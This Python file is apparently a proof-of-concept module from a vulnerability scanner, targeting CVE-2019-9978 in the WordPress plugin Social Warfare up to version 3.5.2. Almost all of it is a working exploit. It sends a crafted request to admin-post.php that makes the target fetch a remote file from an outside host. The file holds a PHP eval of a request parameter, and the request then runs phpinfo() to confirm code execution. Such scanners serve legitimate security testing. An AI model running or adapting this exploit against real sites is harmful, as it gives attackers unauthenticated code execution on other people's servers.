#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""
"""
CVE: CVE-2019-9978
name: wordpress plugin Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)
referer: https://wpvulndb.com/vulnerabilities/9259?fbclid=IwAR2xLSnanccqwZNqc2c7cIv447Lt80mHivtyNV5ZXGS0ZaScxIYcm1XxWXM
vuln-analysis: https://mp.weixin.qq.com/s/jqdXGIG9SRKniI_2ZhKNJQ
date:2019-05-11
"""

from ScanMoudle.xscan_poc.lib.core.Request import request
from ScanMoudle.xscan_poc.lib.utils.random_ua import get_random_ua
from urllib.parse import urlparse


def poc(url):
    # url = "http://www.example.org:8080/default.html?ct=32&op=92&item=98"
    # --> http://www.example.org:8080
    if url[:4] != "http":
        url = "http://" + url
    o = urlparse(url)
    url = o.scheme + "://" + o.netloc

    # 自定义的shell地址，内容为 <pre>eval($_REQUEST['z']);</pre>
    shellpath = "http://saucer-man.com/aa.txt"
    ## TODO 需要多余服务的统一整合
    # 执行的shell命令
    shell = "phpinfo();"

    vulnurl = url + "/wp-admin/admin-post.php?swp_debug=load_options&swp_url={shellpath}&z={shell}".format(shellpath=shellpath,shell=shell)
    try:
        headers= {"User-Agent":get_random_ua()}
        r = request.get(vulnurl, headers = headers, timeout=5, verify=False, allow_redirects=False)
        if r.status_code == 200 and "PHP Version" in r.text:
            return {'payload': vulnurl, 'post_data': '', 'info': 'wordpress plugin Social Warfare <= 3.5.2 - Unauthenticated Remote Code Execution (RCE)'}
        else:
            return False
    except:
        return False